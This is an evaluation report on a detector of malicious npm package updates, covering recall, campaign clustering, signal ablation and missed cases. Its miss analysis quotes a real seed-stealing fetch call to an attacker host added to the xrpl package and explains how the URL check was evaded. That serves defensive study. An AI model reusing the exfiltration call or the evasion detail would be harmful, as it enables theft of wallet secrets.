# Release Sentinel — Stage 3b Evaluation Results

> **Evaluation Honesty**: This report documents the frozen, pre-tuning baseline of Release Sentinel evaluated against 1,349 real-world compromised npm package pairs from the DataDog malicious software dataset. No detection rules, severities, or policy rules were modified.
> **Split Protocol**: The dataset is split temporally by discovery date into **DEV** (before 2026-01-01; 857 pairs) and **TEST** (2026-01-01 and later; 492 pairs). Per-pair failure inspection is strictly confined to DEV; TEST results are reported as aggregates only. All proposed improvements are justified solely from DEV evidence.

---

## 1. Headline Recall

A cluster is counted as detected if **any** member pair within that split is detected.

| Split | Total Pairs | Sample Recall (WARN+) | Sample Recall (BLOCK) | Total Clusters | Cluster Recall (WARN+) | Cluster Recall (BLOCK) |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
| **DEV** (< 2026-01-01) | 857 | **82.03%** (703 / 857) | **77.13%** (661 / 857) | 187 | **19.79%** (37 / 187) | **6.42%** (12 / 187) |
| **TEST** (>= 2026-01-01) | 492 | **45.93%** (226 / 492) | **35.77%** (176 / 492) | 328 | **19.21%** (63 / 328) | **3.96%** (13 / 328) |
| **ALL** | **1,349** | **68.87%** (929 / 1,349) | **62.05%** (837 / 1,349) | **515** | **19.42%** (100 / 515) | **4.85%** (25 / 515) |

### Execution Status Summary
- **Total evaluated**: 1,349 pairs
- **Completed cleanly (`ok`)**: 1,058 pairs (78.43%)
- **Timeouts (`timeout`, 60s limit)**: 278 pairs (20.61%) — 140 in DEV, 138 in TEST
- **Baseline download failures (`baseline_download_failed`)**: 13 pairs (0.96%) — 7 in DEV, 6 in TEST
- **Runtime crashes / errors (`error`)**: 0 pairs (0.00%)

---

## 2. Campaign Cluster Analysis

Attackers routinely reuse malicious payloads across dozens or hundreds of packages in automated spraying campaigns. Evaluating on raw sample counts alone can inflate performance metrics if a single large campaign is detected.

To measure campaign-level generalization, pairs were grouped using **Union-Find clustering** over SHA-256 hashes of new or modified files (excluding `package.json`, `README*`, `LICENSE*`, source maps, and files under 200 bytes).

- **Total Clusters**: 515
- **Largest Cluster Share**: **22.68%** of all samples (Cluster 1: 306 samples, 100% blocked)
- **Top 10 Clusters Share**: **55.97%** of all samples (755 samples)
- **Top 10 Clusters Detection Rate**: **100.0% BLOCK** (all 10 largest campaigns blocked)

### Top 10 Largest Campaigns

| Cluster ID | Rank | Size (Pairs) | Share of Dataset | Earliest Discovery | Decision | Statuses |
| :--- | :---: | :---: | :---: | :---: | :---: | :--- |
| `cluster_0001` | 1 | 306 | 22.68% | 2025-11-24 | **BLOCK** | 306 ok |
| `cluster_0002` | 2 | 195 | 14.46% | 2025-09-15 | **BLOCK** | 195 ok |
| `cluster_0003` | 3 | 81 | 6.00% | 2025-09-15 | **BLOCK** | 81 ok |
| `cluster_0004` | 4 | 52 | 3.85% | 2026-05-11 | **BLOCK** | 52 ok |
| `cluster_0005` | 5 | 25 | 1.85% | 2025-09-16 | **BLOCK** | 25 ok |
| `cluster_0006` | 6 | 24 | 1.78% | 2025-09-14 | **BLOCK** | 24 ok |
| `cluster_0007` | 7 | 21 | 1.56% | 2026-03-20 | **BLOCK** | 21 ok |
| `cluster_0008` | 8 | 19 | 1.41% | 2026-05-19 | **BLOCK** | 19 ok |
| `cluster_0009` | 9 | 17 | 1.26% | 2026-03-20 | **BLOCK** | 17 ok |
| `cluster_0010` | 10 | 15 | 1.11% | 2026-05-19 | **BLOCK** | 15 ok |

*Note on Cluster-level Recall*: 291 of the 415 undetected clusters were singletons resulting from scanner timeouts (278) or missing baseline downloads (13), where no payload file could be hashed.

---

## 3. Per-Evidence Coverage & Ablation

To evaluate the contribution and necessity of each signal, we measure:
1. **Pairs**: Number of pairs where the signal fired.
2. **Clusters**: Number of unique clusters where the signal fired.
3. **Single-Signal**: Pairs where this was the only alerting signal present.
4. **Ablation Recall**: System-wide recall if this signal is completely removed from the policy engine.

| Signal ID | Pairs | Clusters | Single-Signal | Ablated Recall (ALL: WARN+ / BLOCK) | Ablated Recall (DEV: WARN+ / BLOCK) |
| :--- | :---: | :---: | :---: | :---: | :---: |
| `install_script_added` | 839 | 29 | 0 | 68.5% / **24.4%** | 81.4% / **33.7%** |
| `long_encoded_blob` | 910 | 90 | 0 | 68.9% / 61.6% | 82.0% / 77.1% |
| `notable_new_file` | 901 | 73 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `high_entropy_string` | 821 | 31 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `large_size_jump` | 773 | 70 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `hardcoded_url` | 653 | 19 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `process_exec` | 429 | 14 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `registry_token` | 411 | 13 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `network_access` | 382 | 13 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `ci_write` | 358 | 9 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `dynamic_code` | 323 | 47 | 0 | 68.9% / 62.0% | 82.0% / 77.0% |
| `env_enumeration` | 311 | 6 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `shell_profile_write` | 311 | 3 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `dependency_added` | 167 | 130 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `new_files_summary` | 145 | 61 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `dependency_removed` | 75 | 11 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `credential_file_read` | 47 | 4 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `dependency_version_changed` | 20 | 12 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `native_binary_present` | 9 | 2 | 0 | 68.9% / 61.4% | 82.0% / 76.1% |
| `hardcoded_ip` | 4 | 2 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `install_script_changed` | 4 | 2 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `inspection_failed` | 4 | 4 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `large_file_count_jump` | 2 | 2 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |
| `bin_entry_added` | 1 | 1 | 0 | 68.9% / 62.0% | 82.0% / 77.1% |

### Key Ablation Insights
- **`install_script_added` is the linchpin of BLOCK decisions**: Dropping `install_script_added` causes BLOCK recall to collapse from **62.05% down to 24.4%** across ALL (and from 77.13% to 33.7% on DEV). The corroboration policy relies heavily on install hooks pairing with execution, network, or obfuscation.
- **Corroboration pairs prevent single-signal failure**: Zero pairs were detected by only a single signal (`Single-Signal = 0` across all types), proving the corroboration design functions as intended: attacks exhibit multi-faceted capability introductions.

---

## 4. DEV Misses Analysis

In accordance with the evaluation protocol, per-pair failure inspection was performed **exclusively on the DEV set** (154 misses out of 857 DEV pairs). No TEST samples were inspected.

### DEV Miss Categories

| Category | Count | Description |
| :--- | :---: | :--- |
| **`timeout/error`** | **147** | 140 pairs stalled exceeding the 60s timeout limit due to catastrophic regex backtracking on giant minified files; 7 pairs failed baseline download because the baseline version was missing or unpublished before `as_of`. |
| **`capability was already present in old release`** | **5** | Malicious behavior introduced APIs already present in the baseline (e.g. `xrpl` exfiltration using `fetch`, `vant` obfuscation). |
| **`metadata-only`** | **2** | Empty compromised releases where only `package.json` version was bumped without any code changes (e.g. `vant 4.9.12`, `vant 4.9.13`). |
| **`unscanned file type`** | **0** | No misses were caused by uninspected extensions. |
| **`capped`** | **0** | No DEV pairs were missed due to extraction ceiling truncations. |
| **`other`** | **0** | All misses are fully accounted for by the above categories. |

### 10 Concrete DEV Miss Examples

| Package | Old Version | New Version | Category | Malicious Capability Introduced & Miss Cause |
| :--- | :---: | :---: | :--- | :--- |
| `xrpl` | 4.2.0 | 4.2.1 | `capability was already present in old release` | Added `fetch('https://0x9c.xyz/xc', ...)` inside `generateSeed()` to exfiltrate seeds. Baseline already possessed `fetch` capability, and the URL is under 20 chars after scheme (11 chars), bypassing `hardcoded_url`. |
| `xrpl` | 4.2.0 | 4.2.2 | `capability was already present in old release` | Identical seed exfiltration payload as 4.2.1; suppressed by capability diff and short URL. |
| `xrpl` | 4.2.0 | 4.2.3 | `capability was already present in old release` | Identical seed exfiltration payload as 4.2.1. |
| `xrpl` | 4.2.0 | 4.2.4 | `capability was already present in old release` | Identical seed exfiltration payload as 4.2.1. |
| `vant` | 4.9.11 | 4.9.12 | `metadata-only` | Package version bumped in `package.json` with zero files added and zero code files modified. Attack probe / empty release. |
| `vant` | 4.9.11 | 4.9.13 | `metadata-only` | Only `package.json` version bumped and inert `README.md` added. Zero code files modified. |
| `vant` | 4.9.11 | 4.9.14 | `capability was already present in old release` | Modified `lib/utils/support.js` with revised obfuscated function; the baseline already contained an obfuscated function `a0_0x...` in that file, so no new capability was registered. |
| `@postman/final-node-keytar` | 0.0.1 | 0.0.2 | `timeout/error` | Large minified bundled file stalled `_FS_READ_RE` / regex engine; terminated after 60.0s per-pair limit. |
| `@nx/enterprise-cloud` | 3.1.1 | 3.2.0 | `timeout/error` | Baseline version 3.1.1 was unpublished or unavailable in registry prior to discovery date `as_of` timestamp. |
| `@toptal/picasso-charts` | 59.0.6 | 59.1.4 | `timeout/error` | Baseline version 59.0.6 could not be downloaded from registry as of discovery date. |

---

## 5. Proposed Improvements (Derived from DEV Evidence Only)

> [!IMPORTANT]
> The following improvements are proposed based on DEV observations. In strict compliance with the Stage 3b instructions, **none of these changes have been applied**.

1. **Destination-Aware Network Capability Diffing & Short URL Matching**:
   - *DEV Evidence*: `xrpl 4.2.1..4` exfiltrated wallet seed keys to `https://0x9c.xyz/xc`. Detection failed because `network_access` was normalized to package-wide `fetch` (already used in benign xrpl), while `hardcoded_url` requires `[^\s"'`>]{20,}` after `https?://` (the URL had only 11 chars after the scheme).
   - *Proposal*: Pair `network_access` with destination host (e.g. `('network_access', '0x9c.xyz')`), and relax the URL length requirement for non-allowlisted domains.
   - *Estimated Impact*: Successfully detects all 4 `xrpl` compromise releases at BLOCK without affecting benign packages that call allowed APIs.

2. **Regex Backtracking Elimination & Long Line Chunking**:
   - *DEV Evidence*: 140 DEV pairs (and 138 TEST pairs) timed out at 60s because `_FS_READ_RE` backtracked exponentially on multi-megabyte single-line minified bundles (e.g. `@postman/*`, `@tanstack/*`).
   - *Proposal*: Simplify `_FS_READ_RE` using atomic grouping / possessive patterns, or split long lines on delimiter tokens (`;`, `,`) before regex scanning.
   - *Estimated Impact*: Eliminates 278 scanner stalls, reducing total analysis time from ~35 minutes to under 2 minutes and recovering significant recall across large frameworks.

3. **Empty / Metadata-Only Version Bump Alert**:
   - *DEV Evidence*: `vant 4.9.12` and `vant 4.9.13` contain zero code modifications. In compromised accounts, attackers frequently publish dry-run version bumps to verify access before deploying payloads.
   - *Proposal*: Add an informational or low-severity signal `metadata_only_bump` when a release modifies only `version` in `package.json` with no functional code changes.
   - *Estimated Impact*: Flags testing probes by attackers with minimal false positives.

4. **Nearest Baseline Version Fallback**:
   - *DEV Evidence*: 7 DEV pairs failed baseline download because the exact listed predecessor was removed or published post-`as_of`.
   - *Proposal*: When the exact baseline version is unavailable, resolve the highest semantic version published strictly prior to `as_of`.
   - *Estimated Impact*: Recovers 7 baseline-failed pairs in DEV and 6 in TEST.

---

## 6. Operating Point

Comparison of false positive rate on the Stage 2.6 benign smoke test (100 popular packages, same-major stable releases) versus malicious recall on the 1,349 DataDog eval pairs:

| Dataset | Total Pairs | ALLOW | WARN | BLOCK | Alert Rate (WARN+) | Gate Rate (BLOCK) |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
| **Benign Smoke Test** | 100 | **94.0%** (94) | **6.0%** (6) | **0.0%** (0) | 6.0% False Alarm | **0.0% False Block** |
| **Malicious ALL** | 1,349 | 9.56% (129) | 6.82% (92) | **62.05%** (837) | **68.87% Recall** | **62.05% Recall** |
| **Malicious DEV** | 857 | 0.82% (7) | 4.90% (42) | **77.13%** (661) | **82.03% Recall** | **77.13% Recall** |
| **Malicious TEST** | 492 | 24.80% (122) | 10.16% (50) | **35.77%** (176) | **45.93% Recall** | **35.77% Recall** |

*Note*: At the `BLOCK` gate threshold, Release Sentinel achieves **0.0% False Positive Rate** on benign updates while blocking **77.13% of malicious updates in DEV** (62.05% overall).

---

## 7. Limitations

1. **GuardDog Dataset Detection Bias**: The DataDog malicious software dataset was compiled primarily using GuardDog. Consequently, the sample distribution is biased toward attack types detectable by GuardDog's heuristic rules (install scripts, outbound network calls, env harvesting).
2. **Discovery Date as an Upper Bound**: The sample filenames specify the *discovery* date, which is an upper bound on the actual publication date. Time-aware queries (`as_of`) may occasionally include benign metadata that was published between the attack release and discovery.
3. **Exact-Hash Clustering vs. Polymorphic Malware**: Campaign clustering uses SHA-256 hashes of new/modified files. While effective for verbatim copy-paste campaigns, it treats polymorphic variations (where attackers dynamically alter variable names or timestamps) as separate singleton clusters.
4. **Package Popularity Mismatch**: The malicious dataset contains many smaller, niche, or abandoned packages that were hijacked, whose internal code structure differs substantially from the top-20 highly-engineered enterprise packages tested in the benign smoke test.
